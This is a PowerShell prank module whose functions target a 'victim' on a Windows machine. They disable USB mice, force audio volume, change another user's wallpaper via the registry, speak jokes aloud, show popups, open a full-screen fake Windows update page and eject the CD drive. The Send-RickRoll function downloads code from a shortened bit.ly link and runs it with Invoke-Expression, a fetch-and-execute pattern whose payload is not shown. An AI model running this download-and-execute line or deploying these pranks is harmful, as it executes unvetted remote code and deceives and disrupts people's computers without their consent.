#HELPER FUNCTIONS
Function Start-AudioControl {
Add-Type -TypeDefinition '
using System.Runtime.InteropServices;
[Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IAudioEndpointVolume
{
    // f(), g(), ... are unused COM method slots. Define these if you care
    int f(); int g(); int h(); int i();
    int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext);
    int j();
    int GetMasterVolumeLevelScalar(out float pfLevel);
    int k(); int l(); int m(); int n();
    int SetMute([MarshalAs(UnmanagedType.Bool)] bool bMute, System.Guid pguidEventContext);
    int GetMute(out bool pbMute);
}
[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDevice
{
    int Activate(ref System.Guid id, int clsCtx, int activationParams, out IAudioEndpointVolume aev);
}
[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDeviceEnumerator
{
    int f(); // Unused
    int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);
}
[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }
public class Audio
{
    static IAudioEndpointVolume Vol()
    {
        var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;
        IMMDevice dev = null;
        Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(/*eRender*/ 0, /*eMultimedia*/ 1, out dev));
        IAudioEndpointVolume epv = null;
        var epvid = typeof(IAudioEndpointVolume).GUID;
        Marshal.ThrowExceptionForHR(dev.Activate(ref epvid, /*CLSCTX_ALL*/ 23, 0, out epv));
        return epv;
    }
    public static float Volume
    {
        get { float v = -1; Marshal.ThrowExceptionForHR(Vol().GetMasterVolumeLevelScalar(out v)); return v; }
        set { Marshal.ThrowExceptionForHR(Vol().SetMasterVolumeLevelScalar(value, System.Guid.Empty)); }
    }
    public static bool Mute
    {
        get { bool mute; Marshal.ThrowExceptionForHR(Vol().GetMute(out mute)); return mute; }
        set { Marshal.ThrowExceptionForHR(Vol().SetMute(value, System.Guid.Empty)); }
    }
}
'
}

Function Disable-Mouse
{
    $PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
    $PNPMice.Disable()
}

Function Enable-Mouse
{
    $PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
    $PNPMice.Enable()
}

Function Set-WallPaper
{
    Param(
        [parameter(Mandatory=$true)]
        [string]$Path,
        [parameter(Mandatory=$true)]
        [string]$UserName
    )

    if (-Not(Test-Path $Path))
    {
        Write-Error "Path to the Wallpaper does not exist, try again"
        return    
    }

    $AdObj = New-Object System.Security.Principal.NTAccount("$UserName")
    $strSID = $AdObj.Translate([System.Security.Principal.SecurityIdentifier]).Value

    $RemoteReg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', $Env:Computername)

    $RegPath = $strSID + "\Control Panel\Desktop"

    $WallPaper= $RemoteReg.OpenSubKey($RegPath,$True)
    $WallPaper.SetValue("Wallpaper",$Path)
}

#Sets the Audio Level to Maximum
Function Set-AudioMax {
    Start-AudioControl
    [audio]::Volume = 1
}

#Sets the Audio Level to a Minimum
Function Set-AudioMin {
    Start-AudioControl
    [audio]::Volume = 0
}

#Sets the Audio Level to your own liking
Function Set-AudioLevel {
    Param(
        [parameter(Mandatory=$true)]
        [ValidateRange(0,1)]
        [double]$AudioLevel
    )

    Start-AudioControl
    [audio]::Volume = $AudioLevel
}

#Unmutes the Audio
Function Unmute-Audio {
    Start-AudioControl
    [Audio]::Mute = $false
}

#Mutes the Audio
Function Mute-Audio {
    Start-AudioControl
    [Audio]::Mute = $true
}

#Sends a random joke to your victim, has a switch to send as a messagebox
Function Send-Joke {
    Param(
       [switch]$AsMessageBox
    )

    $Joke = Invoke-RestMethod -Uri 'https://official-joke-api.appspot.com/jokes/random' -Method Get

    if ($AsMessageBox)
    {
        $Message = (($Joke).setup) + " " + ($Joke).punchline
        msg.exe * $Message
    }
    else {
        Add-Type -AssemblyName System.speech
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $SpeechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
        $SpeechSynth.Speak(($Joke).setup)
        Start-Sleep -Seconds 1
        $SpeechSynth.Speak(($Joke).punchline)
    }
}

#Sends a random catfact to your prank victim
Function Send-CatFact 
{
    Add-Type -AssemblyName System.speech
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $SpeechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
    $CatFact = Invoke-RestMethod -Uri 'https://catfact.ninja/fact' -Method Get | Select-Object -ExpandProperty fact
    $SpeechSynth.Speak("did you know?")
    $SpeechSynth.Speak($CatFact)
}

#Sends a random Chuck Norris fact to your prank victim
Function Send-ChuckNorrisFact 
{
    Add-Type -AssemblyName System.speech
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $SpeechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
    $ChuckFact = Invoke-RestMethod -Uri 'https://api.chucknorris.io/jokes/random' -Method Get | Select-Object -ExpandProperty Value
    $SpeechSynth.Speak("did you know?")
    $SpeechSynth.Speak($ChuckFact)
}

#Sends a random Dad Joke to your prank victim
Function Send-DadJoke 
{
    Add-Type -AssemblyName System.speech
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $SpeechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
    
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Accept", 'text/plain')
    
    $DadJoke = Invoke-RestMethod -Uri 'https://icanhazdadjoke.com' -Method Get -Headers $headers
    
    $SpeechSynth.Speak($DadJoke)
}

#Sends the best song ever to your prank victim
Function Send-RickRoll 
{
    Invoke-Expression (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")
}

#Sends epic gandalf
Function Send-Gandalf
{
    Set-AudioLevel(0.4) #For optimal surprise
    Start-Process iexplore -ArgumentList "-k https://player.vimeo.com/video/198392879?autoplay=1"
}

#Opens up ie and sends user to a fake win10 update page and fullscreens ie
Function Send-FakeUpdate
{ 
    Start-Process iexplore -ArgumentList "-k http://fakeupdate.net/win10u/"
}

#Sends Row, Row, Row your boat to your prank victim
Function Send-RowBoat 
{
    Add-Type -AssemblyName System.speech
    $SpeechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
    $SpeechSynth.Speak("Row, Row, Row your boat gently down the stream. Merrily! Merrily! Merrily! Life is but a dream.")    
}

#Sends a custom message to any user logged into the computer
Function Send-Message([string]$Message)
{
    msg.exe * $Message
}

Function Send-Alarm
{
    Invoke-WebRequest -Uri "https://github.com/perplexityjeff/PowerShell-Troll/raw/master/AudioFiles/Wake-up-sounds.wav" -OutFile "Wake-up-sounds.wav"

    $filepath = ((Get-Childitem "Wake-up-sounds.wav").FullName)
    
    Write-Host $filepath

    $sound = new-Object System.Media.SoundPlayer;
    $sound.SoundLocation=$filepath;
    $sound.Play();
}

#Open the CD Drive
Function Open-CDDrive
{
    Add-Type -TypeDefinition  @'
    using System;
    using System.Runtime.InteropServices;
    using System.ComponentModel;
     
    namespace CDROM
    {
        public class Commands
        {
            [DllImport("winmm.dll")]
            static extern Int32 mciSendString(string command, string buffer, int bufferSize, IntPtr hwndCallback);
     
            public static void Eject()
            {
                 string rt = "";
                 mciSendString("set CDAudio door open", rt, 127, IntPtr.Zero);
            }
     
            public static void Close()
            {
                 string rt = "";
                 mciSendString("set CDAudio door closed", rt, 127, IntPtr.Zero);
            }
        }
    }  
'@

[CDROM.Commands]::Eject()
}

#Close the CD Drive
Function Close-CDDrive{
    Add-Type -TypeDefinition  @'
    using System;
    using System.Runtime.InteropServices;
    using System.ComponentModel;
     
    namespace CDROM
    {
        public class Commands
        {
            [DllImport("winmm.dll")]
            static extern Int32 mciSendString(string command, string buffer, int bufferSize, IntPtr hwndCallback);
     
            public static void Eject()
            {
                 string rt = "";
                 mciSendString("set CDAudio door open", rt, 127, IntPtr.Zero);
            }
     
            public static void Close()
            {
                 string rt = "";
                 mciSendString("set CDAudio door closed", rt, 127, IntPtr.Zero);
            }
        }
    }  
'@

[CDROM.Commands]::Close()
}

#Send all the notifications that Windows has with a custom interval
Function Send-NotificationSoundSpam
{
    param
    (
        [Parameter()][int]$Interval = 4
    )

    Get-ChildItem C:\Windows\Media\ -File -Filter *.wav | Select-Object -ExpandProperty Name | Foreach-Object { Start-Sleep -Seconds $Interval; (New-Object Media.SoundPlayer "C:\WINDOWS\Media\$_").Play(); }
}

#Send a custom voice message
Function Send-VoiceMessage([string]$Message)
{
    Add-Type -AssemblyName System.speech
    $SpeechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
    $SpeechSynth.Speak($Message)
}

#Sends the song from Super Mario
Function Send-SuperMario
{
    Function b($a,$b){
        [console]::beep($a,$b)
    }
    
    Function s($a){
        Start-Sleep -m $a
    }    

    b 660 100;
    s 150;
    b 660 100;
    s 300;
    b 660 100;
    s 300;
    b 510 100;
    s 100;
    b 660 100;
    s 300;
    b 770 100;
    s 550;
    b 380 100;
    s 575;

    b 510 100;
    s 450;
    b 380 100;
    s 400;
    b 320 100;
    s 500;
    b 440 100;
    s 300;
    b 480 80;
    s 330;
    b 450 100;
    s 150;
    b 430 100;
    s 300;
    b 380 100;
    s 200;
    b 660 80;
    s 200;
    b 760 50;
    s 150;
    b 860 100;
    s 300;
    b 700 80;
    s 150;
    b 760 50;
    s 350;
    b 660 80;
    s 300;
    b 520 80;
    s 150;
    b 580 80;
    s 150;
    b 480 80;
    s 500;

    b 510 100;
    s 450;
    b 380 100;
    s 400;
    b 320 100;
    s 500;
    b 440 100;
    s 300;
    b 480 80;
    s 330;
    b 450 100;
    s 150;
    b 430 100;
    s 300;
    b 380 100;
    s 200;
    b 660 80;
    s 200;
    b 760 50;
    s 150;
    b 860 100;
    s 300;
    b 700 80;
    s 150;
    b 760 50;
    s 350;
    b 660 80;
    s 300;
    b 520 80;
    s 150;
    b 580 80;
    s 150;
    b 480 80;
    s 500;

    b 500 100;
    s 300;

    b 760 100;
    s 100;
    b 720 100;
    s 150;
    b 680 100;
    s 150;
    b 620 150;
    s 300;

    b 650 150;
    s 300;
    b 380 100;
    s 150;
    b 430 100;
    s 150;

    b 500 100;
    s 300;
    b 430 100;
    s 150;
    b 500 100;
    s 100;
    b 570 100;
    s 220;

    b 500 100;
    s 300;

    b 760 100;
    s 100;
    b 720 100;
    s 150;
    b 680 100;
    s 150;
    b 620 150;
    s 300;

    b 650 200;
    s 300;

    b 1020 80;
    s 300;
    b 1020 80;
    s 150;
    b 1020 80;
    s 300;

    b 380 100;
    s 300;
    b 500 100;
    s 300;

    b 760 100;
    s 100;
    b 720 100;
    s 150;
    b 680 100;
    s 150;
    b 620 150;
    s 300;

    b 650 150;
    s 300;
    b 380 100;
    s 150;
    b 430 100;
    s 150;

    b 500 100;
    s 300;
    b 430 100;
    s 150;
    b 500 100;
    s 100;
    b 570 100;
    s 420;

    b 585 100;
    s 450;

    b 550 100;
    s 420;

    b 500 100;
    s 360;

    b 380 100;
    s 300;
    b 500 100;
    s 300;
    b 500 100;
    s 150;
    b 500 100;
    s 300;

    b 500 100;
    s 300;

    b 760 100;
    s 100;
    b 720 100;
    s 150;
    b 680 100;
    s 150;
    b 620 150;
    s 300;

    b 650 150;
    s 300;
    b 380 100;
    s 150;
    b 430 100;
    s 150;

    b 500 100;
    s 300;
    b 430 100;
    s 150;
    b 500 100;
    s 100;
    b 570 100;
    s 220;

    b 500 100;
    s 300;

    b 760 100;
    s 100;
    b 720 100;
    s 150;
    b 680 100;
    s 150;
    b 620 150;
    s 300;

    b 650 200;
    s 300;

    b 1020 80;
    s 300;
    b 1020 80;
    s 150;
    b 1020 80;
    s 300;

    b 380 100;
    s 300;
    b 500 100;
    s 300;

    b 760 100;
    s 100;
    b 720 100;
    s 150;
    b 680 100;
    s 150;
    b 620 150;
    s 300;

    b 650 150;
    s 300;
    b 380 100;
    s 150;
    b 430 100;
    s 150;

    b 500 100;
    s 300;
    b 430 100;
    s 150;
    b 500 100;
    s 100;
    b 570 100;
    s 420;

    b 585 100;
    s 450;

    b 550 100;
    s 420;

    b 500 100;
    s 360;

    b 380 100;
    s 300;
    b 500 100;
    s 300;
    b 500 100;
    s 150;
    b 500 100;
    s 300;

    b 500 60;
    s 150;
    b 500 80;
    s 300;
    b 500 60;
    s 350;
    b 500 80;
    s 150;
    b 580 80;
    s 350;
    b 660 80;
    s 150;
    b 500 80;
    s 300;
    b 430 80;
    s 150;
    b 380 80;
    s 600;

    b 500 60;
    s 150;
    b 500 80;
    s 300;
    b 500 60;
    s 350;
    b 500 80;
    s 150;
    b 580 80;
    s 150;
    b 660 80;
    s 550;

    b 870 80;
    s 325;
    b 760 80;
    s 600;

    b 500 60;
    s 150;
    b 500 80;
    s 300;
    b 500 60;
    s 350;
    b 500 80;
    s 150;
    b 580 80;
    s 350;
    b 660 80;
    s 150;
    b 500 80;
    s 300;
    b 430 80;
    s 150;
    b 380 80;
    s 600;

    b 660 100;
    s 150;
    b 660 100;
    s 300;
    b 660 100;
    s 300;
    b 510 100;
    s 100;
    b 660 100;
    s 300;
    b 770 100;
    s 550;
    b 380 100;
    s 575;
}

Function Send-HappyBirthday
{
    $BeepList = @(
    @{ Pitch = 1059.274; Length = 300; };
    @{ Pitch = 1059.274; Length = 200; };
    @{ Pitch = 1188.995; Length = 500; };
    @{ Pitch = 1059.274; Length = 500; };
    @{ Pitch = 1413.961; Length = 500; };
    @{ Pitch = 1334.601; Length = 950; };

    @{ Pitch = 1059.274; Length = 300; };
    @{ Pitch = 1059.274; Length = 200; };
    @{ Pitch = 1188.995; Length = 500; };
    @{ Pitch = 1059.274; Length = 500; };
    @{ Pitch = 1587.117; Length = 500; };
    @{ Pitch = 1413.961; Length = 950; };

    @{ Pitch = 1059.274; Length = 300; };
    @{ Pitch = 1059.274; Length = 200; };
    @{ Pitch = 2118.547; Length = 500; };
    @{ Pitch = 1781.479; Length = 500; };
    @{ Pitch = 1413.961; Length = 500; };
    @{ Pitch = 1334.601; Length = 500; };
    @{ Pitch = 1188.995; Length = 500; };
    @{ Pitch = 1887.411; Length = 300; };
    @{ Pitch = 1887.411; Length = 200; };
    @{ Pitch = 1781.479; Length = 500; };
    @{ Pitch = 1413.961; Length = 500; };
    @{ Pitch = 1587.117; Length = 500; };
    @{ Pitch = 1413.961; Length = 900; };
    );

    foreach ($Beep in $BeepList) {
        [System.Console]::Beep($Beep['Pitch'], $Beep['Length']);
    }
}
